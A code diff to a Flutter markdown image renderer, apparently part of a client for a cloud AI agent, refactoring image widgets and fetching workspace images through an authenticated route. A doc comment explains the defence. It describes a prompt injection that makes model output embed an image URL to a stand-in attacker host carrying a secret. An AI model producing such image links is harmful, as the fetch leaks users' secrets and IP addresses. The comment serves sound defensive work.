@@ -1,10 +1,9 @@
-import 'dart:io';
-
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 
 import '../core/theme.dart';
 import '../core/url_safety.dart';
+import 'workspace_image.dart';
 
 /// What the user chose in the link confirmation sheet.
 enum LinkChoice { open, copy, cancel }
@@ -196,7 +195,8 @@ class _Warning extends StatelessWidget {
 /// injection can embed `![](https://attacker/p?d=<secret>)`, and the fetch
 /// alone leaks the data and the user's IP. http(s) images show a
 /// "Tap to load" placeholder naming the host; `data:` images and files
-/// inside the active session's workspace render directly; everything else
+/// inside the user's cloud workspace (relative paths) render via
+/// [WorkspaceImage]; everything else
 /// (absolute paths, `file:`, other schemes) is refused. All decodes are
 /// capped with `cacheWidth`.
 Widget safeMarkdownImage(Uri uri, String? title, String? alt) {
@@ -207,52 +207,37 @@ Widget safeMarkdownImage(Uri uri, String? title, String? alt) {
   if (scheme == 'data') {
     final data = uri.data;
     if (data == null || !data.mimeType.startsWith('image/')) {
-      return _ImageNote(alt: alt, note: 'Image not shown');
+      return ImageNote(alt: alt, note: 'Image not shown');
     }
     try {
-      return _CappedImage(
+      return CappedImage(
         builder: (cacheWidth) => Image.memory(
           data.contentAsBytes(),
           cacheWidth: cacheWidth,
           fit: BoxFit.contain,
           errorBuilder: (_, _, _) =>
-              _ImageNote(alt: alt, note: 'Image could not be shown'),
+              ImageNote(alt: alt, note: 'Image could not be shown'),
         ),
       );
     } catch (_) {
-      return _ImageNote(alt: alt, note: 'Image could not be shown');
+      return ImageNote(alt: alt, note: 'Image could not be shown');
     }
   }
-  if (scheme.isEmpty) {
-    final file = _workspaceImageFile(uri.path);
-    if (file != null) {
-      return _CappedImage(
-        builder: (cacheWidth) => Image.file(
-          file,
-          cacheWidth: cacheWidth,
-          fit: BoxFit.contain,
-          errorBuilder: (_, _, _) =>
-              _ImageNote(alt: alt, note: 'Image could not be shown'),
-        ),
-      );
+  if (scheme.isEmpty && !uri.hasAuthority) {
+    // Workspace-relative image written by the cloud agent (SE-018): fetched
+    // through the authenticated workspace route. Absolute paths, `..`, `~`,
+    // backslashes and non-image extensions are refused before any request.
+    if (normalizeWorkspaceImagePath(uri.path) != null) {
+      return WorkspaceImage(path: uri.path, alt: alt);
     }
   }
-  return _ImageNote(alt: alt, note: 'Image not shown');
+  return ImageNote(alt: alt, note: 'Image not shown');
 }
 
-/// Resolves a workspace-relative image path, or null when it is absolute,
-/// escapes the workspace, or there is no active workspace.
-File? _workspaceImageFile(String rawPath) {
-  final p = Uri.decodeComponent(rawPath).replaceAll('\\', '/');
-  if (p.isEmpty || p.startsWith('/') || p.startsWith('~')) return null;
-  // The thin client has no local workspace (P8 Task 19): a workspace-relative
-  // image path never resolves. Server artifacts render through their R2 URL
-  // instead (the retired local service's `workspaceRootFor` died with it).
-  return null;
-}
-
-class _CappedImage extends StatelessWidget {
-  const _CappedImage({required this.builder});
+/// Bounds an image's decode width (`cacheWidth`) to the layout width times
+/// the device pixel ratio (64..2048 px) and its height to 480.
+class CappedImage extends StatelessWidget {
+  const CappedImage({super.key, required this.builder});
   final Widget Function(int cacheWidth) builder;
 
   @override
@@ -289,13 +274,13 @@ class _RemoteImagePlaceholderState extends State<RemoteImagePlaceholder> {
   @override
   Widget build(BuildContext context) {
     if (_load) {
-      return _CappedImage(
+      return CappedImage(
         builder: (cacheWidth) => Image.network(
           widget.uri.toString(),
           cacheWidth: cacheWidth,
           fit: BoxFit.contain,
           errorBuilder: (_, _, _) =>
-              _ImageNote(alt: widget.alt, note: 'Image could not be loaded'),
+              ImageNote(alt: widget.alt, note: 'Image could not be loaded'),
         ),
       );
     }
@@ -335,8 +320,9 @@ class _RemoteImagePlaceholderState extends State<RemoteImagePlaceholder> {
   }
 }
 
-class _ImageNote extends StatelessWidget {
-  const _ImageNote({this.alt, required this.note});
+/// The calm bracketed note shown in place of an image that is not rendered.
+class ImageNote extends StatelessWidget {
+  const ImageNote({super.key, this.alt, required this.note});
   final String? alt;
   final String note;
 
